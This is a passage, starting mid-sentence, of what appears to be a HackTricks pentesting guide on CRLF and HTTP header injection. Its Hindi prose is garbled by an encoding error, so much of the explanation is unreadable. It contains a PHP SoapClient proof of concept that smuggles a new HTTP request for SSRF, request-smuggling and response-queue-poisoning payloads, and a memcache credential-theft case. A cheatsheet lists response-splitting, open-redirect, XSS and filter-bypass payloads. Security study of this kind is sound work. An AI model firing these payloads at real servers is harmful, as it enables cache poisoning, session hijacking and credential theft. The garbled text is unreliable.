рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░рдиреЗ рдпрд╛ рдЕрдиреНрдпрдерд╛ рдЕрдкреНрд░рдпреЛрдЬреНрдп [рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ (XSS) рд╕рдВрдХрдЯ](https://www.netsparker.com/blog/web-security/cross-site-scripting-xss/) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

#### рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП HTTP рд╣реЗрдбрд░ рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд╛ рдЙрджрд╛рд╣рд░рдг

рдпрджрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░реНрдзрдХ CORS (рдХреНрд░реЙрд╕ рдСрд░рд┐рдЬрд┐рди рд░рд┐рд╕реЛрд░реНрд╕ рд╢реЗрдпрд░рд┐рдВрдЧ) рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рд╡рд╛рд▓реЗ HTTP рд╣реЗрдбрд░реНрд╕ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SOP (рд╕рдорд╛рди рдореВрд▓ рдиреАрддрд┐) рджреНрд╡рд╛рд░рд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдореВрд▓реЛрдВ рдХреА рд╕рд╛рдЗрдЯреЛрдВ рдХреЛ рдПрдХ рджреВрд╕рд░реЗ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рд╕реЗ рд░реЛрдХрддреА рд╣реИред

### SSRF рдореЗрдВ рдирдпрд╛ HTTP рдЕрдиреБрд░реЛрдз

CRLF рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдПрдХ **рдирдпрд╛ HTTP рдЕрдиреБрд░реЛрдз рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред\
PHP рдореЗрдВ `SoapClient` рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдЧреИрдЬреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЕрдЪреНрдЫрд╛ рдЙрджрд╛рд╣рд░рдг рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдХрдХреНрд╖рд╛ `user_agent` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рднреАрддрд░ CRLF рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдирдП рд╣реЗрдбрд░ рдФрд░ рдмреЙрдбреА рд╕рд╛рдордЧреНрд░реА рдХреЛ **рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рдЗрд╕ рд╕рдВрдХрдЯ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирдП HTTP рдЕрдиреБрд░реЛрдз рдХреЛ **рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ** рдХреА рднреА рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ:
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

#Put a nc listening in port 9090
$client->__soapCall("test", []);
```
### рд╣реЗрдбрд░ рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд░рдХреЗ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рд╕реНрдордЧрд▓рд┐рдВрдЧ

рдЖрдк рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реЗрдбрд░реНрд╕ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **рдмреИрдХ-рдПрдВрдб рд╕рдВрдкрд░реНрдХ рдХреЛ рдЦреЛрд▓реЗ рд░рдЦреЗрдВ** рдкреНрд░рд╛рд░рдВрднрд┐рдХ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдХреЗ рдЙрддреНрддрд░ рдХреЗ рдмрд╛рдж:
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
рддреЛ, **рдПрдХ рджреВрд╕рд░реА рдЕрдиреБрд░реЛрдз** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░реЗрдВред рдпрд╣рд╛рдВ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ **рдХреНрд▓рд╛рд╕рд┐рдХ** [**рдЕрдиреБрд░реЛрдз рдЕрдкрд░рд╛рдз**](http-request-smuggling/) рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдХреНрд░рдордг рдХреЗ рдмрд╛рдж рдЕрддрд┐рд░рд┐рдХреНрдд **рд╣реИрдбрд░/рдмреЙрдбреА** рдЬреЛрдбрд╝реЗ рдЬрд╛рддреЗ рд╣реИрдВред\
рдпрд╣рд╛рдВ рджреЛ рд╕реЗ рдЕрдзрд┐рдХ рдкрд╛рд░-рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╢реЛрд╖рдг рдХреЗ рд▓рд┐рдП рдХреБрдЫ рд╡рд┐рдХрд▓реНрдк рд╣реИрдВред

рдпрд╛ рддреЛ рдЕрдЧрд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЕрдиреБрд░реЛрдз рдпрд╛ рд╡реЗрдм рдХреИрд╢ рдХреЛ рджреВрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдкреНрд░реАрдлрд┐рдХреНрд╕** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░реЗрдВ:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

рдпрд╛ рд╣рдорд╛рд░реЗ рдкреНрд░реАрдлрд┐рдХреНрд╕ рдХреЛ рдЯреНрд░реЗрд▓рд┐рдВрдЧ рдЬрдВрдХ рдХреЗ рд╕рд╛рде рдорд┐рд▓рд╛рдХрд░ рдПрдХ рдкреВрд░реНрдг рджреВрд╕рд░рд╛ рдЕрдиреБрд░реЛрдз рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рдХрд░реЗрдВ рддрд╛рдХрд┐ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрддрд╛рд░ рджреВрд╖рд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

рдЗрд╕ рддрдХрдиреАрдХ рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рд╕рдорд╕реНрдпрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдореВрд▓ рд╕реНрд░реЛрдд рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)ред

### рдореЗрдордХреИрд╢ рдЕрдкрд╡рд╛рдж

рдореЗрдордХреИрд╢ рдПрдХ **рдХреНрд▓рд┐рдпрд░ рдкрд╛рда рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдХреБрдВрдЬреА-рдореВрд▓реНрдп рд╕рдВрдЧреНрд░рд╣** рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП:

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

рдпрджрд┐ рдХреЛрдИ рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо **рдПрдХ HTTP рдЕрдиреБрд░реЛрдз рд╕реЗ рдбреЗрдЯрд╛ рд▓реЗрддреА рд╣реИ рдФрд░ рдЗрд╕реЗ рд╕реЗрдирд┐рдЯрд╛рдЗрдЬрд╝ рдирд╣реАрдВ рдХрд░рдХреЗ** рдПрдХ **рдореЗрдордХреИрд╢** рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП **рдЕрдиреБрд░реЛрдз** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рдирдП рдореЗрдордХреИрд╢ рдХрдорд╛рдВрдб рдШреБрд╕рд╛рдиреЗ** рдХрд╛ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдореВрд▓ рдЦреЛрдЬ рдореЗрдВ, рдХреИрд╢ рдХреБрдВрдЬреАрдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЙрд╕ IP рдФрд░ рдкреЛрд░реНрдЯ рдХреЛ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рд╛рдпрд╛ рдЧрдпрд╛ рдерд╛, рдФрд░ рд╣рдорд▓рд╛рд╡рд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рд╡реЗ **рдореЗрдордХреИрд╢ рдХрдорд╛рдВрдб рдШреБрд╕рд╛рдиреЗ** рдХрд░ рд╕рдХрддреЗ рдереЗ рдЬреЛ **рдХреИрд╢ рдХреЛ рджреВрд╖рд┐рдд рдХрд░реЗрдЧрд╛** рдФрд░ рд╡рд┐рдХреНрдЯрд┐рдо рдХреЗ рд╡рд┐рд╡рд░рдг (рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рд╕рд╣рд┐рдд) рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рднреЗрдЬреЗрдЧрд╛:

<figure><img src="../.gitbook/assets/image (6) (1) (4).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╢реЛрдзрдХрд░реНрддрд╛рдУрдВ рдиреЗ рдпрд╣ рднреА рдЦреЛрдЬрд╛ рдХрд┐ рд╡реЗ рдореЗрдордХреИрд╢ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдбрд┐рд╕рд┐рдВрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдИрдореЗрд▓ рдкрддреЗ рдФрд░ рдкреЛрд░реНрдЯ рднреЗрдЬ рд╕рдХреЗрдВ рдЬрд┐рдирдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЬреНрдЮрд╛рдд рдирд╣реАрдВ рдерд╛:

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

**рдкреВрд░реА рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП** [**рдореВрд▓ рд▓реЗрдЦ рдкрдврд╝реЗрдВ**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)\*\*\*\*

## CRLF рдЗрдВрдЬреЗрдХреНрд╢рди рд╕рдВрдХрдЯ рдХреЗ рдкреНрд░рднрд╛рд╡

CRLF рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рдкреНрд░рднрд╛рд╡ рднрд┐рдиреНрди рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рд╕рднреА рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ рд╕реЗ рд╕реВрдЪрдирд╛ рд╡рд┐рдлрд▓рддрд╛ рддрдХ рдХреЗ рдкреНрд░рднрд╛рд╡ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВред рдпрд╣ рд╡рд┐рдХреНрдЯрд┐рдо рдХреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ XSS рдлрд╝рд┐рд▓реНрдЯрд░ рдФрд░ рд╕рдорд╛рди рдореВрд▓ рдиреАрддрд┐ рдЬреИрд╕реА рдХреБрдЫ рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╡реЗ рджреБрд╖реНрдЯ рд╣рдорд▓реЛрдВ рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛ рдЬрд╛рддреЗ рд╣реИрдВред

### рд╡реЗрдм рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдореЗрдВ CRLF / HTTP рд╣реЗрдбрд░ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреИрд╕реЗ рд░реЛрдХреЗрдВ

рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рдирд┐рд╡рд╛рд░рдг рддрдХрдиреАрдХ рд╣реИ рдХрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╣реЗрдбрд░ рдореЗрдВ рд╕реАрдзреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рди рдХрд░реЗрдВред рдпрджрд┐ рдпрд╣ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ, рддреЛ рдЖрдкрдХреЛ рд╣рдореЗрд╢рд╛ CRLF рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдгреЛрдВ рдХреЛ рдПрдирдХреЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред рдПрдХ рдЕрдЪреНрдЫрд╛ рд╡реЗрдм рдЕрдиреБрдкреНрд░рдпреЛрдЧ рд╕реБрд░рдХреНрд╖рд╛ рдЕрдЪреНрдЫрд╛ рдЕрднреНрдпрд╛рд╕ рд╣реИ рдХрд┐ рдЖрдк рдЕрдкрдиреА рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рднрд╛рд╖рд╛ рдХреЛ рдПрдХ рд╕рдВрд╕реНрдХрд░рдг рдореЗрдВ рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВ рдЬреЛ CR рдФрд░ LF рдХреЛ HTTP рд╣реЗрдбрд░ рд╕реЗрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдореЗрдВ рдШреБрд╕рд╛рдиреЗ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИред

### CHEATSHEET
```
1. HTTP Response Splitting
тАв /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
тАв //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
тАв /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
тАв /google.com/%2F..%0D%0AHeader-Test:test2
тАв /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
тАв /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
тАв /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
тАв %E5%98%8A = %0A = \u560a
тАв %E5%98%8D = %0D = \u560d
тАв %E5%98%BE = %3E = \u563e (>)
тАв %E5%98%BC = %3C = \u563c (<)
тАв Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## рдЙрдкрдХрд░рдг

{% embed url="https://github.com/dwisiswant0/crlfuzz" %}

## рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдбрд┐рдЯреЗрдХреНрд╢рди рд╕реВрдЪреА

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/crlf.txt" %}

## рд╕рдВрджрд░реНрдн

* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)

<img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

рдпрджрд┐ рдЖрдк **рд╣реИрдХрд┐рдВрдЧ рдХрд░рд┐рдпрд░** рдореЗрдВ рд░реБрдЪрд┐ рд░рдЦрддреЗ рд╣реИрдВ рдФрд░ рдЕрд╣реИрдХреЗрдмрд▓ рдХреЛ рд╣реИрдХ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ - рд╣рдо рднрд░реНрддреА рдХрд░ рд░рд╣реЗ рд╣реИрдВ! (_рдЕрдЪреНрдЫреА рдкреЛрд▓рд┐рд╢ рд▓рд┐рдЦрдиреЗ рдФрд░ рдмреЛрд▓рдиреЗ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдЖрд╡рд╢реНрдпрдХ_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рдЪрд╛рд╣рд┐рдП? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛** рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ рд╣рдореЗрдВ PR рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>
